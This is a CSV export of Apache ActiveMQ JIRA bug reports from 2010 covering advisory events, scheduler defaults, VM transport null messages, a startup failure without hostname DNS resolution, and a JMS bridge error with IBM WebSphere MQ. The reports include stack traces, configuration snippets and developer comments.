Fire advisory events when destinations are created/delete via JMX,AMQ-2970,12483539,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,11/Oct/10 16:48,22/Oct/10 08:57,14/Jul/23 05:43,22/Oct/10 08:57,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,Currently these operations don't trigger advisory events.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14847,,,Fri Oct 22 08:57:51 UTC 2010,,,,,,,,,,,"0|i0b9pj:",63685,Regression,,,,,,,,,,,,,,,,,,,,"11/Oct/10 16:51;dejanb;Fixed with svn revision 1021425;;;","21/Oct/10 18:19;gtully;There was a regression but the fix need anther pair of eyes.. see the comment with the test and fix: r1026092;;;","22/Oct/10 08:57;dejanb;refactored with svn revision 1026254;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Have Schedular support disabled by default,AMQ-2967,12483447,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,08/Oct/10 14:47,08/Oct/10 15:23,14/Jul/23 05:43,08/Oct/10 15:23,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"This feature should be enabled by config, as it creates a new store and some threads at startup, they should only be created when required.

related: https://issues.apache.org/activemq/browse/AMQ-2959",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2959,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14753,,,Fri Oct 08 15:23:34 UTC 2010,,,,,,,,,,,"0|i0b9wn:",63717,,,,,,,,,,,,,,,,,,,,,"08/Oct/10 15:23;gtully;resolved in r1005858;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Null messages occurring when using VM transport, topics and multiple consumers",AMQ-2966,12483459,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,08/Oct/10 10:48,08/Oct/10 11:01,14/Jul/23 05:43,08/Oct/10 11:01,5.4.0,5.4.1,,,,5.4.2,,,Broker,,,,0,,,,,,,,,"introduced by fix for https://issues.apache.org/activemq/browse/AMQ-2103

contention on marshaling message received over vm transport for the first time causes potential null. With multiple topic consumers there is contention as the message has not been unmarshalled on dispatch to the topic due to the vm transport being used.
moving the set to null out of the beforeMarahallMessage removes the potential sync window that causes the problem. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14846,,,Fri Oct 08 11:01:48 UTC 2010,,,,,,,,,,,"0|i0b9z3:",63728,Regression,,,,,,,,,,,,,,,,,,,,"08/Oct/10 11:01;gtully;resolved in r1005773;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ fails to start if no DNS resolution for hostname is available,AMQ-2965,12483809,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,bsnyder,bsnyder,bsnyder,07/Oct/10 20:18,28/Oct/10 00:02,14/Jul/23 05:43,28/Oct/10 00:02,5.3.0,5.3.1,5.3.2,5.4.0,5.4.1,5.4.2,,,Broker,,,,0,,,,,,,,,"ActiveMQ is installed on a physical server with two ethernet interfaces -- the first is a 10.x.x.x network and used only for external traffic , the second interface is a 172.x.x.x network and is used only for internal (intra-cluster node) communication. ActiveMQ is configured to listen only on the 172.x.x.x interface. External DNS resolution exists but internal DNS resolution does not. While each host has a unique name, none of these names are resolvable. Under these circumstances, ActiveMQ fails to start up successfully. Below are the exceptions and stack trace: 

{panel}
2010-06-09 16:48:45,714 | ERROR | Failed to resolve localhost | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
2010-06-09 16:48:46,092 | INFO | Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter@47c297a3 | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
2010-06-09 16:48:46,928 | INFO | JMX consoles can connect to service:jmx:rmi://localhost:11616/jndi/rmi://localhost:1616/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector 
2010-06-09 16:48:47,036 | INFO | ActiveMQ 5.3.2 JMS Message Broker (Q01M0003) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
2010-06-09 16:48:47,036 | INFO | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
2010-06-09 16:48:47,280 | WARN | could not generate unique stub | org.apache.activemq.util.IdGenerator | WrapperSimpleAppMain 
java.net.UnknownHostException: Q01M0003: Q01M0003 
        at java.net.InetAddress.getLocalHost(Unknown Source) 
        at org.apache.activemq.util.IdGenerator.&amp;lt;clinit&amp;gt;(IdGenerator.java:52) 
        at org.apache.activemq.broker.region.RegionBroker.&amp;lt;clinit&amp;gt;(RegionBroker.java:75) 
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1734) 
        at org.apache.activemq.broker.BrokerService.createRegionBroker(BrokerService.java:1728) 
        at org.apache.activemq.broker.BrokerService.createBroker(BrokerService.java:1688) 
        at org.apache.activemq.broker.BrokerService.getBroker(BrokerService.java:706) 
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:469) 
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409) 
        at java.security.AccessController.doPrivileged(Native Method) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380) 
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264) 
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164) 
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429) 
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728) 
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380) 
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&amp;lt;init&amp;gt;(ResourceXmlApplicationContext.java:64) 
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&amp;lt;init&amp;gt;(ResourceXmlApplicationContext.java:52) 
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) 
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) 
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) 
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) 
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115) 
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251) 
        at org.apache.activemq.console.Main.main(Main.java:107) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240) 
        at java.lang.Thread.run(Unknown Source) 
2010-06-09 16:48:47,407 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: Transport Connector could not be registered in JMX: Q01M0003: Q01M0003 | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
java.io.IOException: Transport Connector could not be registered in JMX: Q01M0003: Q01M0003 
        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27) 
        at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1585) 
        at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2006) 
        at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1959) 
        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:491) 
        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:85) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409) 
        at java.security.AccessController.doPrivileged(Native Method) 
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380) 
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264) 
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185) 
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164) 
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429) 
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728) 
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380) 
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&amp;lt;init&amp;gt;(ResourceXmlApplicationContext.java:64) 
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.&amp;lt;init&amp;gt;(ResourceXmlApplicationContext.java:52) 
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) 
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) 
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) 
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) 
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115) 
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251) 
        at org.apache.activemq.console.Main.main(Main.java:107) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) 
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) 
        at java.lang.reflect.Method.invoke(Unknown Source) 
        at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240) 
        at java.lang.Thread.run(Unknown Source) 
Caused by: java.net.UnknownHostException: Q01M0003: Q01M0003 
        at java.net.InetAddress.getLocalHost(Unknown Source) 
        at org.apache.activemq.transport.tcp.TcpTransportServer.resolveHostName(TcpTransportServer.java:336) 
        at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:142) 
        at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:60) 
        at org.apache.activemq.transport.TransportFactory.bind(TransportFactory.java:131) 
        at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:305) 
        at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:137) 
        at org.apache.activemq.broker.TransportConnector.asManagedConnector(TransportConnector.java:100) 
        at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1580) 
        ... 47 more 
2010-06-09 16:48:47,409 | INFO | ActiveMQ Message Broker (Q01M0003, null) is shutting down | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
2010-06-09 16:48:47,410 | INFO | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain 
2010-06-09 16:48:47,535 | INFO | ActiveMQ JMS Message Broker (Q01M0003, null) stopped | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain 
{panel}

This problem can be worked around by adding an entry to the /etc/hosts file for each machine. Unfortunately this presents quite a maintenance nightmare in a very large environment. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Oct/10 23:54;bsnyder;AMQ-2965-patch.txt;https://issues.apache.org/jira/secure/attachment/12461815/AMQ-2965-patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14745,,,Thu Oct 28 00:02:12 UTC 2010,,,,,,,,,,,"0|i0b9rz:",63696,,,,,,,,,,,,,,,,,,,,,"07/Oct/10 20:24;bsnyder;Attaching a patch that solves the problem that is caused by the lack of name resolution. ;;;","28/Oct/10 00:02;bsnyder;Fixed via revision 1028143 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMSBridgeConnectors does not work with IBM MQ and ActiveMQ 5.4.0,AMQ-2963,12483906,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,r_v_rajeev,r_v_rajeev,07/Oct/10 06:52,04/Jan/11 15:51,14/Jul/23 05:43,04/Jan/11 13:03,5.3.0,5.3.1,5.3.2,5.4.0,5.4.1,5.5.0,,,Connector,,,,2,,,,,,,,,"We are trying to create a bridge with IBM Websphere Queue and ActiveMQ queue. We have defined a broker in activemq.xml with following jmsBridgeConnectors information:

<jmsBridgeConnectors>
    <jmsQueueConnector
      outboundQueueConnectionFactory=""#remoteFactory"">
      <inboundQueueBridges>
        <inboundQueueBridge inboundQueueName=""IBM.TO.ACTIVEMQ"" localQueueName=""IBM.TO.ACTIVEMQ""/>
      </inboundQueueBridges>
   </jmsQueueConnector>
</jmsBridgeConnectors>

We are getting below error with activemq 5.4.0 and it works fine with version 5.2.0:

com.ibm.msg.client.jms.DetailedInvalidDestinationException: JMSCMQ0005: The destination name '://IBM.TO.ACTIVEMQ' was not valid. The destination name specified does not conform to published destination syntax. Correct the specified destination name and try again.
        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
        at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
        at com.ibm.msg.client.commonservices.j2se.NLSServices.createException(NLSServices.java:313)
        at com.ibm.msg.client.commonservices.nls.NLSServices.createException(NLSServices.java:388)
        at com.ibm.msg.client.wmq.common.internal.WMQDestinationURIParser.setUri(WMQDestinationURIParser.java:524)
        at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3148)
        at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3104)
        at com.ibm.msg.client.wmq.factories.WMQFactoryFactory.createProviderDestination(WMQFactoryFactory.java:444)
        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.setProviderDestination(JmsDestinationImpl.java:333)
        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.initialise(JmsDestinationImpl.java:231)
        at com.ibm.msg.client.jms.admin.JmsDestinationImpl.<init>(JmsDestinationImpl.java:196)
        at com.ibm.msg.client.jms.admin.JmsJndiDestinationImpl.<init>(JmsJndiDestinationImpl.java:129)
        at com.ibm.mq.jms.MQDestination.<init>(MQDestination.java:186)
        at com.ibm.msg.client.wmq.factories.admin.WMQJmsFactory.createDestination(WMQJmsFactory.java:125)
        at com.ibm.msg.client.jms.internal.JmsMessageImpl.providerDestToJmsDest(JmsMessageImpl.java:2111)
        at com.ibm.msg.client.jms.internal.JmsMessageImpl.getJMSDestination(JmsMessageImpl.java:686)
        at com.ibm.jms.JMSMessage.getJMSDestination(JMSMessage.java:605)
        at org.apache.activemq.ActiveMQMessageTransformation.copyProperties(ActiveMQMessageTransformation.java:206)
        at org.apache.activemq.ActiveMQMessageTransformation.transformMessage(ActiveMQMessageTransformation.java:188)
        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1720)
        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)
        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:300)
        at org.apache.activemq.ActiveMQQueueSender.send(ActiveMQQueueSender.java:111)
        at org.apache.activemq.network.jms.QueueBridge.sendMessage(QueueBridge.java:80)
        at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:129)
        at com.ibm.mq.jms.MQMessageConsumer$FacadeMessageListener.onMessage(MQMessageConsumer.java:399)
        at com.ibm.msg.client.jms.internal.JmsMessageConsumerImpl$JmsProviderMessageListener.onMessage(JmsMessageConsumerImpl.java:904)
        at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.honourNoLocal(WMQAsyncConsumerShadow.java:550)
        at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.consumer(WMQAsyncConsumerShadow.java:384)
        at com.ibm.mq.jmqi.remote.internal.RemoteAsyncConsume.driveConsumer(RemoteAsyncConsume.java:1478)
        at com.ibm.mq.jmqi.remote.internal.RemoteDispatchThread.run(RemoteDispatchThread.java:385)
        at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.runTask(WorkQueueItem.java:209)
        at com.ibm.msg.client.commonservices.workqueue.SimpleWorkQueueItem.runItem(SimpleWorkQueueItem.java:100)
        at com.ibm.msg.client.commonservices.workqueue.WorkQueueItem.run(WorkQueueItem.java:224)
        at com.ibm.msg.client.commonservices.workqueue.WorkQueueManager.runWorkQueueItem(WorkQueueManager.java:298)
        at com.ibm.msg.client.commonservices.j2se.workqueue.WorkQueueManagerImplementation$ThreadPoolWorker.run(WorkQueueManagerImplementation.java:1220)

I looked at the code for class ActiveMQsession has a method send which was modified after v 5.2.0 and below lines of code were moved before transforming the IBM JMS Message to Active MQ message:
            message.setJMSDestination(destination);
            message.setJMSDeliveryMode(deliveryMode);
            long expiration = 0L;
            if (!producer.getDisableMessageTimestamp()) {
                long timeStamp = System.currentTimeMillis();
                message.setJMSTimestamp(timeStamp);
                if (timeToLive > 0) {
                    expiration = timeToLive + timeStamp;
                }
            }
            message.setJMSExpiration(expiration);
            message.setJMSPriority(priority);
            message.setJMSRedelivered(false);

Now code sets the ActiveMQDestination as the JMS destination to IBM Message before transformation and we are getting above error when JMS properties are getting copied from IBM Message to ActiveMQMessage inside ActiveMQMessageTransformation.","Operating System - Windows XP Professional 
Tomcat v6.0.28 
IBM Websphere MQ v7.0.1.2 
ActiveMQ 5.4.0",pchandler,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2029,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14782,,,Tue Jan 04 15:51:53 UTC 2011,,,,,,,,,,,"0|i0akcf:",59569,,,,,,,,,,,,,,,,,,,,,"22/Dec/10 19:32;pchandler;Help, Hit the same issue:

        <jmsBridgeConnectors> 
            <jmsQueueConnector name=""LargeCompanytoActiveMQBridge"" 
                               outboundQueueConnectionFactory=""#remoteFactory"" >
                <inboundQueueBridges>
                    <inboundQueueBridge inboundQueueName=""QUEUE1"" />
                </inboundQueueBridges>
            </jmsQueueConnector>
        </jmsBridgeConnectors>

    <bean id=""remoteFactory"" class=""com.ibm.mq.jms.MQQueueConnectionFactory""> 
        <property name=""transportType"" value=""1""/> 
        <property name=""hostName"" value=""HostName""/> 
        <property name=""port"" value=""port#""/> 
        <property name=""queueManager"" value=""queue.manager.1""/> 
        <property name=""channel"" value=""CHANNEL1""/> 
    </bean>

When I send data to QUEUE1 on Websphere MQ I get this error in ActiveMQ.
2010-12-22 13:56:43,634 | INFO  | JMS Connector LargeCompanytoActiveMQBridge Started | org.apache.activemq.network.jms.JmsConnector | main
// ...
2010-12-22 13:56:59,820 | ERROR | failed to forward message on attempt: 1 reason: com.ibm.msg.client.jms.DetailedInvalidDestinationException: JMSCMQ0005: The destination name '://QUEUE1' was not valid. The destination name specified does not conform to published destination syntax. Correct the specified destination name and try again. message: 
  JMSMessage class: jms_text
  JMSType:          null
  JMSDeliveryMode:  2
  JMSExpiration:    0
  JMSPriority:      4
  JMSMessageID:     ID:414d512071756575652e6d616e6167657835114d06a30020
  JMSTimestamp:     1293044219816
  JMSCorrelationID: null
  JMSDestination:   <ERROR>
  JMSReplyTo:       null
  JMSRedelivered:   false
    JMSXAppID: amqsput                     
    JMSXDeliveryCount: 1
    JMSXUserID: mqm         
    JMS_IBM_Character_Set: UTF-8
    JMS_IBM_Encoding: 273
    JMS_IBM_Format: MQSTR   
    JMS_IBM_MsgType: 8
    JMS_IBM_PutApplType: 6
    JMS_IBM_PutDate: 20101222
    JMS_IBM_PutTime: 18565978
test | org.apache.activemq.network.jms.DestinationBridge | DispatchThread: 1
com.ibm.msg.client.jms.DetailedInvalidDestinationException: JMSCMQ0005: The destination name '://QUEUE1' was not valid. The destination name specified does not conform to published destination syntax. Correct the specified destination name and try again.
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
	at com.ibm.msg.client.commonservices.j2se.NLSServices.createException(NLSServices.java:313)
	at com.ibm.msg.client.commonservices.nls.NLSServices.createException(NLSServices.java:388)
	at com.ibm.msg.client.wmq.common.internal.WMQDestinationURIParser.setUri(WMQDestinationURIParser.java:524)
	at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3148)
	at com.ibm.msg.client.wmq.common.internal.WMQDestination.<init>(WMQDestination.java:3104)
	at com.ibm.msg.client.wmq.factories.WMQFactoryFactory.createProviderDestination(WMQFactoryFactory.java:444)
	at com.ibm.msg.client.jms.admin.JmsDestinationImpl.setProviderDestination(JmsDestinationImpl.java:333)
	at com.ibm.msg.client.jms.admin.JmsDestinationImpl.initialise(JmsDestinationImpl.java:231)
	at com.ibm.msg.client.jms.admin.JmsDestinationImpl.<init>(JmsDestinationImpl.java:196)
	at com.ibm.msg.client.jms.admin.JmsJndiDestinationImpl.<init>(JmsJndiDestinationImpl.java:129)
	at com.ibm.mq.jms.MQDestination.<init>(MQDestination.java:191)
	at com.ibm.msg.client.wmq.factories.admin.WMQJmsFactory.createDestination(WMQJmsFactory.java:125)
	at com.ibm.msg.client.jms.internal.JmsMessageImpl.providerDestToJmsDest(JmsMessageImpl.java:2111)
	at com.ibm.msg.client.jms.internal.JmsMessageImpl.getJMSDestination(JmsMessageImpl.java:686)
	at com.ibm.jms.JMSMessage.getJMSDestination(JMSMessage.java:605)
	at org.apache.activemq.ActiveMQMessageTransformation.copyProperties(ActiveMQMessageTransformation.java:206)
	at org.apache.activemq.ActiveMQMessageTransformation.transformMessage(ActiveMQMessageTransformation.java:188)
	at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1720)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:231)
	at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:300)
	at org.apache.activemq.ActiveMQQueueSender.send(ActiveMQQueueSender.java:111)
	at org.apache.activemq.network.jms.QueueBridge.sendMessage(QueueBridge.java:80)
	at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:129)
	at com.ibm.mq.jms.MQMessageConsumer$FacadeMessageListener.onMessage(MQMessageConsumer.java:399)
	at com.ibm.msg.client.jms.internal.JmsMessageConsumerImpl$JmsProviderMessageListener.onMessage(JmsMessageConsumerImpl.java:904)
	at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.honourNoLocal(WMQAsyncConsumerShadow.java:551)
	at com.ibm.msg.client.wmq.internal.WMQAsyncConsumerShadow.consumer(WMQAsyncConsumerShadow.java:385)
